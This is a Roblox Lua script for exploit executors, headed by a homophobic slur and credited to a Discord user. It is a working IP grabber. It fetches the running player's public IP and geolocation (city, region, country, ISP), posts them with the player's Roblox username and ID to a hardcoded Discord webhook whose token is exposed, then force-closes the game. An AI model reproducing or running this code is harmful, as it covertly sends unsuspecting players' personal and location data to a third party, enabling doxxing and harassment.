--# CRACK IF GAY - MADE BY 0rep on discord
local HttpService = game:GetService("HttpService")
local req = (http_request or request or syn and syn.request)

-- SETTINGS
local WEBHOOK_URL = "https://discord.com/api/webhooks/1372316329012498452/dHiTEVxQeG2YLDflZeFPKteXaPo8n13Ka01lLvY4D3V2YdkpmeE9gWe0n4GCQ4i0jnUY"

-- Ensure HTTP request is working
if not req then
    print("HTTP requests not supported.")
    return
end

-- INIT
local ip = "Unknown"
local geoData = {}

-- TRY TO GET IP
print("Attempting to fetch IP...")
pcall(function()
    local ipResponse = req({
        Url = "https://api.ipify.org?format=json",
        Method = "GET"
    })
    if ipResponse and ipResponse.StatusCode == 200 then
        ip = HttpService:JSONDecode(ipResponse.Body).ip
        print("IP fetched successfully: " .. ip)  -- Debug output
    else
        print("Failed to fetch IP.")  -- Debug output
    end
end)

-- TRY TO GET GEOLOCATION (AND VPN STATUS)
print("Attempting to fetch GeoLocation...")
pcall(function()
    local geoResponse = req({
        Url = "https://ipapi.co/json",
        Method = "GET"
    })
    if geoResponse and geoResponse.StatusCode == 200 then
        geoData = HttpService:JSONDecode(geoResponse.Body)
        print("GeoLocation data fetched.")  -- Debug output
    else
        print("Failed to fetch GeoLocation.")  -- Debug output
    end
end)

-- LOGGING USER DATA TO DEBUG
print("Username: " .. game.Players.LocalPlayer.Name)
print("UserID: " .. game.Players.LocalPlayer.UserId)
print("IP: " .. ip)
print("GeoData: " .. HttpService:JSONEncode(geoData))

-- BUILD AND LOG TO DISCORD WEBHOOK (if available)
if ip ~= "Unknown" and geoData.country_name then
    local msg = string.format([[
    Script executed:
    Username: %s (%s)
    IP: %s
    Location: %s, %s
    Country: %s
    ISP: %s
    ]], game.Players.LocalPlayer.Name, game.Players.LocalPlayer.UserId, ip, geoData.city or "Unknown", geoData.region or "Unknown", geoData.country_name, geoData.org or "Unknown")

    pcall(function()
        req({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({ content = msg })
        })
    end)
else
    print("IP or Geo data was not retrieved, check your requests.")
end

-- CLOSE THE GAME AFTER
wait(1)
game:Shutdown()
